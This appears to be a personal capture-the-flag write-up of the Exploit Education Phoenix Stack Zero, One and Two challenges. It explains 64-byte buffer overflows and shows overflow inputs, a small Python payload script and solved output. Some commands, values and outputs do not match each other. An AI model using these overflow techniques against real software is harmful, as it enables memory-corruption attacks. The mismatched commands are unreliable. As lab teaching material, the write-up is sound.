 #WORK IN PROGRESS
 ## Table of Contents
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [Challenge 1 - Stack Zero](#challenge-1---stack-zero)
- [Challenge 2 - Stack One](#challenge-2---stack-one)
- [Challenge 3 - Stack Two](#challenge-3---stack-two)

## Introduction

Welcome to my exploit write up on the Pheonix challanges from the website [Exploit Education](https://exploit.education). 

## Challenge 1 - Stack Zero

[Stack Zero Code](https://exploit.education/phoenix/stack-zero/). 

The challenges starts off very easy. All the code does is check if the volatile integer named changeme has been changed after getting user input. It puts the user input into a buffer with a size of 64 bytes. Since the buffer is only 64 bytes and the code does not check to see if the user input is greater than that, all that is need to exploit the program is give it an input greater than 64 bytes. 

### Solved
```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed!
```

## Challenge 2 - Stack One

[Stack One Code](https://exploit.education/phoenix/stack-one/). 

This challenge is just as easy as the last. Instead of taking in a user input this program takes a command line argument then calls strcpy to copy it into the buffer variable. As an added challenge the volatile integer now must be change to a specific value in bytes. Just like the last challenge the buffer is a size 64 bytes meaning it can be overflowed if given a command argument this is a size greater than 64 bytes. If you give the program over 64 'A's it will tell you that the change me variable is not the correct value and what the given value is. The value of changeme is 4 A's in hexcode form.

```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x41414141, we want 0x496c5962
```
Since we now know what the program wants the changeme variable to be. We just need to add that to the end of 64 bytes of A. First we need to translate the hex code into ascii to know what to added to the end of the A's. Looking at a hex to ascii chart gets us 49 = I, 6c = l, 59 = Y, and 62 = b.

```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIlYb
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x62596c49, we want 0x496c5962
```
If you put the new characters at the end of the argument string you will see that the challenge is still not complete. The reason for this is because of endianness the system uses little-endian design which flips in the argument that changes the changeme variable. If you account for endianness then the challenge is solved.

### Solved
```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```
### OR

A second easier way to solve the challenge is to create a python script that prints out the bytes we need instead of going through the trouble of translating them to ascii. Still need to follow endianness.

```python
import sys
fill = b'A' * 64
adr = b'\x62\x59\x6c\x49'
sys.stdout.buffer.write(fill+adr)
```

```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero $(python3 stack-one.py)
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Challenge 3 - Stack Two

[Stack Two Code](https://exploit.education/phoenix/stack-two/). 

For this challenge like the last one, it doesn't use user input. Instead of using a command line argument too, the program uses an environment variable called, ExploitEducation. It sets a char pointer to where ever the environment variable is set. Then what ever is in ExploitEducation variable is copied into the variable. buffer, which is a char array with the size of 64 bits. Like the last challenge the volatile integer  must be change to a specific value in bytes. Since the buffer is a size of 64 bytes like the other challenges, it can be overflowed if given an environment variable that contains a string greater than 64 bytes. To set the environment variable you just put in the command line ExploitEducation = “xxxx” then the program. Like:

```bash
user@phoenix-amd64:~$ ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA /opt/phoenix/amd64/stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x41414141, we want 0x0d0a090a
```

If you set the variable over 64 'A's it will tell you that the change me variable is not the correct value and what the given value should be. Unlike the last challenge the hex code can not be converted to ascii. So in order to set the variable to the right hex code all you need to do is add “\x{hexcode}”. Since the program wants 0x0d0a09 you just need to add \x0a\x09\x0a\x0d, which accounts for endianness, to the end of 64 other characters. That is it, the challenge is solved.

### Solved
```bash
user@phoenix-amd64:~$ ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0a\x09\x0a\x0d /opt/phoenix/amd64/stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```
